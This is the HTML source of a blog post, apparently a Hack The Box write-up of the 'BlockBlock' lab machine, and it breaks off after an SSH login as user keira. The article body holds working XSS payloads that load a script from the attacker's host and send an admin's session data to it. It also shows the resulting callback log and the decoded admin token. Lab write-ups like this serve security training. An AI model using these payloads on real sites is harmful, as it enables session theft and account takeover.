@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/03/27/hackthebox-blockblock/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewBlockBlock is a hard-difficulty machine from Hack The Box dealing initially with a XSS attack on a chatbot that will allow us to get an admin token where we’ll be abusing exposed Ethereum Bloc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: BlockBlock">
+<meta property="og:url" content="http://fouedsaidi.com/2025/03/27/Hackthebox-BlockBlock/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewBlockBlock is a hard-difficulty machine from Hack The Box dealing initially with a XSS attack on a chatbot that will allow us to get an admin token where we’ll be abusing exposed Ethereum Bloc">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/BlockBlock.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/web.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/chat.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/chat1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/report.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/admin.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/json.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/json1.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/block.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/keira.png">
+<meta property="article:published_time" content="2025-03-27T14:07:15.000Z">
+<meta property="article:modified_time" content="2025-03-28T05:31:12.654Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/BlockBlock/BlockBlock.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: BlockBlock -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: BlockBlock</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-27 15:07:15</span>
+        <span class="mobile">2025-03-27 15:07:15</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-28 06:31:12</span>
+            <span class="mobile">2025-03-28 06:31:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>BlockBlock is a hard-difficulty machine from Hack The Box dealing initially with a XSS attack on a chatbot that will allow us to get an admin token where we’ll be abusing exposed Ethereum Blockchain RCP endpoints to get input data of a specific block on the Blockchain containing sensitive credentials. We’ll then abuse forge from foundry which allows us to interact with Solidity Smart Contract to move laterally across the system and finally abuse pacman by creating a malicious package then installing it to get root access</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/BlockBlock.png"
+                      alt="BlockBlock-info-card"
+                ><figcaption>BlockBlock-info-card</figcaption></figure></p>
+<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nmap <span class="literal">-A</span> <span class="literal">-Pn</span>  <span class="number">10.129</span>.<span class="number">215.46</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://nmap.org ) at <span class="number">2025</span><span class="literal">-03-27</span> <span class="number">15</span>:<span class="number">07</span> W. Central Africa Standard Time</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.129</span>.<span class="number">215.46</span></span><br><span class="line">Host is up (<span class="number">0.44</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered tcp ports (no<span class="literal">-response</span>)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">9.7</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>:</span><br><span class="line">|   <span class="number">256</span> d6:<span class="number">31</span>:<span class="number">91</span>:f6:<span class="number">8</span>b:<span class="number">95</span>:<span class="number">11</span>:<span class="number">2</span>a:<span class="number">73</span>:<span class="number">7</span>f:ed:ae:a5:c1:<span class="number">45</span>:<span class="number">73</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> f2:ad:<span class="number">6</span>e:f1:e3:<span class="number">89</span>:<span class="number">38</span>:<span class="number">98</span>:<span class="number">75</span>:<span class="number">31</span>:<span class="number">49</span>:<span class="number">7</span>a:<span class="number">93</span>:<span class="number">60</span>:<span class="number">07</span>:<span class="number">92</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    Werkzeug httpd <span class="number">3.0</span>.<span class="number">3</span> (Python <span class="number">3.12</span>.<span class="number">3</span>)</span><br><span class="line">|_http<span class="literal">-title</span>:          Home  - DBLC</span><br><span class="line">|_http<span class="literal">-server-header</span>: Werkzeug/<span class="number">3.0</span>.<span class="number">3</span> Python/<span class="number">3.12</span>.<span class="number">3</span></span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">120.73</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our usual ssh port alongside a python web app deployed on port 80. Let’s explore that.</p>
+<h3 id="Web-Application-http-10-129-215-46"><a href="#Web-Application-http-10-129-215-46" class="headerlink" title="Web Application - http://10.129.215.46"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://10.129.215.46/" >http://10.129.215.46 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/web.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Seems like a casual web app at first with a login, registration, chat and profile features. Let’s register an account and see what we can do:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/chat.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>We are directly redirected to the chat interface where we can interact with the bot and send messages:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/chat1.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>But it was not responding to me and didn’t want to give me the flags :(<br>We could also navigate to <a class="link"   target="_blank" rel="noopener" href="http://10.129.215.46/api/contract_source" >http://10.129.215.46/api/contract_source <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to check the smart contract on the app.<br>A smart contract is basically a piece of code that organizes our solution and keeps it in check (it basically code lol haha)</p>
+<p>One more feature we could use is the <code>report user</code> where we type a username and we get this response:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/report.png"
+                      alt="Web App"
+                ><figcaption>Web App</figcaption></figure></p>
+<p>Hmmmm it says that the <code>moderators</code> will take action, this smells like XSS to me.<br>Let’s try to do a basic XSS payload to check our thought:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;1&quot;</span> onerror=<span class="string">&quot;this.remove(); var s=document.createElement(&#x27;script&#x27;); s.src=&#x27;http://10.10.16.27&#x27;; document.body.appendChild(s);&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>This XSS payload attempts to inject and execute a malicious script by first using an invalid image source to trigger the onerror event, which removes the broken image, creates a new <code>&lt;script&gt;</code> element, sets its source to <a class="link"   target="_blank" rel="noopener" href="http://10.10.16.10/" >http://10.10.16.10 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and appends it to the document body, forcing the victim’s browser to load and execute the external script.</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">215.46</span> - - [<span class="number">27</span>/<span class="type">Mar</span>/<span class="number">2025</span> <span class="number">15</span>:<span class="number">26</span>:<span class="number">45</span>] <span class="string">&quot;GET / HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And indeed we get a callback! Let’s now create a malicious xss payload to fetch us the moderators cookies:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/info&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://10.10.16.27/?log=&#x27;</span> + <span class="title function_">btoa</span>(text), &#123;</span><br><span class="line">        <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+
+<p>And we got it:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; python3 <span class="literal">-m</span> http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on :: port <span class="number">80</span> (http://[::]:<span class="number">80</span>/) ...</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">215.46</span> - - [<span class="number">27</span>/<span class="type">Mar</span>/<span class="number">2025</span> <span class="number">15</span>:<span class="number">28</span>:<span class="number">58</span>] <span class="string">&quot;GET /xss.js HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">215.46</span> - - [<span class="number">27</span>/<span class="type">Mar</span>/<span class="number">2025</span> <span class="number">15</span>:<span class="number">28</span>:<span class="number">58</span>] <span class="string">&quot;GET /?log=eyJyb2xlIjoiYWRtaW4iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUptY21WemFDSTZabUZzYzJVc0ltbGhkQ0k2TVRjME16QTROakk1TWl3aWFuUnBJam9pT1dVMVpqTTFaRE10T1RSa09TMDBPR1F6TFRrelkySXRaRGsxTXpJeE1tUXpZMkkySWl3aWRIbHdaU0k2SW1GalkyVnpjeUlzSW5OMVlpSTZJbUZrYldsdUlpd2libUptSWpveE56UXpNRGcyTWpreUxDSmxlSEFpT2pFM05ETTJPVEV3T1RKOS54WFJSNGJ0Nm1CeFM3OVNNd0VXeGU3UEVKZzJxNkhlZUltSzFLYWFsMGVZIiwidXNlcm5hbWUiOiJhZG1pbiJ9Cg== HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br></pre></td></tr></table></figure></div>
+
+<p>This decrypts to:</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTc0MzA4NjI5MiwianRpIjoiOWU1ZjM1ZDMtOTRkOS00OGQzLTkzY2ItZDk1MzIxMmQzY2I2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImFkbWluIiwibmJmIjoxNzQzMDg2MjkyLCJleHAiOjE3NDM2OTEwOTJ9.xXRR4bt6mBxS79SMwEWxe7PEJg2q6HeeImK1Kaal0eY&quot;</span><span class="punctuation">,</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s now use the admin token to connect to its account:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/admin.png"
+                      alt="Admin Access"
+                ><figcaption>Admin Access</figcaption></figure></p>
+<p>Now after inserting the admin token, we have access to a new <code>/admin</code> endpoint.<br>Checking the source code on thad &#x2F;admin page, we find an interesting <code>/api/json-rpc</code> endpoint, let’s check it out using BurpSuite:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/json.png"
+                      alt="Admin Access"
+                ><figcaption>Admin Access</figcaption></figure></p>
+<p>We can see that this endpoint is returning to us an Authorization token in a first request, maybe we’ll use it a bit later. And then there is a second request to the same endpoint but with different data being passed:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/json1.png"
+                      alt="Admin Access"
+                ><figcaption>Admin Access</figcaption></figure></p>
+<p>From what I can understand, we’re interacting with the Blockchain on the server using RPC endpoints. We’re now sending a request using the <code>eth_getBalance</code> method to get our user’s balance which is returning 0.<br>Doing some googling, I found <a class="link"   target="_blank" rel="noopener" href="https://www.quicknode.com/docs/ethereum/" >this documentation for quicknode  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> where we can see all kinds of methods to interact with the Blockchain. There was one method which is <code>eth_getBlockByNumber</code> which allows us to get information of the block matching the given block number and we must supply it with a block number and a boolean value of true&#x2F;false which when put to true returns all the transaction objects. So let’s do that against the very first block:</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/block.png"
+                      alt="Blockchain info"
+                ><figcaption>Blockchain info</figcaption></figure></p>
+<p>And we do get a return for the second block of the blockchain. Scrolling down a bit we find our input data which is basically HEX for different OP Codes. Once we decode that from HEX using <a class="link"   target="_blank" rel="noopener" href="https://cyberchef.io/" >https://cyberchef.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> we get a username and what seems like a password for user <code>keira</code><br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/BlockBlock/keira.png"
+                      alt="Credentials"
+                ><figcaption>Credentials</figcaption></figure></p>
+<p>And we are in with our user flag:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; ssh keira@<span class="number">10.129</span>.<span class="number">215.46</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.129.215.46 (10.129.215.46)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:Yxhk4seV11xMS6Vp0pPoLicen3kJ7RAkXssZiL2/t3c.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span><span class="number">10.129</span>.<span class="number">215.46</span><span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">keira@10.129.215.46&#x27;</span>s password:</span><br><span class="line">Last login: Mon Nov <span class="number">18</span> <span class="number">17</span>:<span class="number">09</span>:<span class="number">05</span> <span class="number">2024</span> from <span class="number">10.10</span>.<span class="number">14.23</span></span><br><span class="line">[<span class="type">keira</span>@<span class="type">blockblock</span> ~]<span class="variable">$</span> id</span><br><span class="line">uid=<span class="number">1000</span>(keira) gid=<span class="number">1000</span>(keira) groups=<span class="number">1000</span>(keira)</span><br><span class="line">[<span class="type">keira</span>@<span class="type">blockblock</span> ~]<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line"><span 